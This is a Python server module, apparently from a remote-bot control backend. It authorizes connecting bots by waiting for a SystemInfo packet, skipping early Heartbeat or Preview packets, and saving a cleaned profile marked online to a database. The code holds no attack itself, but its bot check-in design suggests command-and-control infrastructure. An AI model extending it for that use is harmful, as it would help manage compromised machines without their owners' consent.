# backend/Services/Auth.py

import asyncio
import time
from typing import Any, Dict, Optional, Tuple

import backend.LoggerWrapper as logger
from backend.Database import db_get_bots, db_update_bot
from .network import NetworkProtocol

async def authorize_bot(
    reader: asyncio.StreamReader, 
    ip_address: str
) -> Optional[Tuple[str, Dict[str, Any]]]:
    """
    Выполняет первичную идентификацию бота по протоколу V8.0.
    Ожидает пакет [SystemInfo:json:none:none].
    Игнорирует другие пакеты (Heartbeat, Preview), если они пришли раньше авторизации.
    """
    try:
        start_time = time.time()
        timeout = 15.0 # Общий лимит времени на авторизацию

        while (time.time() - start_time) < timeout:
            # Читаем пакет через NetworkProtocol
            # Внутренний read_packet уже делает корректный read(8) и парсинг
            packet_data = await asyncio.wait_for(
                NetworkProtocol.read_packet(reader), 
                timeout=5.0
            )
            
            bot_identifier, metadata, payload = packet_data

            if not bot_identifier or not metadata:
                continue

            # Проверяем, является ли пакет "паспортом" бота
            if metadata.get("module") == "SystemInfo":
                if isinstance(payload, dict):
                    # Если бот не прислал IP или прислал заглушку, ставим IP сокета
                    if payload.get("ip") in ["0.0.0.0", "127.0.0.1", None]:
                        payload["ip"] = ip_address
                    
                    # Сохраняем в БД и помечаем как Online
                    bot_full_profile = sync_bot_data(bot_identifier, payload)
                    
                    logger.Log.success(f"[Auth] Bot '{bot_identifier}' authorized successfully")
                    return bot_identifier, bot_full_profile
                
                logger.Log.warning(f"[Auth] SystemInfo received but payload is not a dict from {ip_address}")
            else:
                # Если пришел другой модуль (например, Heartbeat или Preview), 
                # мы его игнорируем и продолжаем ждать SystemInfo
                logger.Log.debug(f"[Auth] Skipping early packet '{metadata.get('module')}' from {ip_address}")

    except asyncio.TimeoutError:
        logger.Log.debug(f"[Auth] Authorization timeout for {ip_address}")
    except Exception as e:
        logger.Log.error(f"[Auth] Critical Error during authorization: {e}")
    
    return None

def sync_bot_data(bot_identifier: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    """
    Обновление профиля бота в SQLite с очисткой данных.
    """
    all_bots = db_get_bots()
    # Получаем существующие данные или создаем новый профиль
    bot_profile = all_bots.get(bot_identifier, {"id": bot_identifier})
    
    # Список «мусорных» значений
    forbidden = [None, "", "??", "Loading...", "Idle", "Initializing"]
    
    # Очистка входящих данных
    sanitized = {
        k: v for k, v in payload.items() 
        if v not in forbidden
    }
    
    # Сливаем данные и форсируем статус Online
    bot_profile.update(sanitized)
    bot_profile["status"] = "online"
    
    # Сохраняем в базу данных
    db_update_bot(bot_identifier, bot_profile)
    
    return bot_profile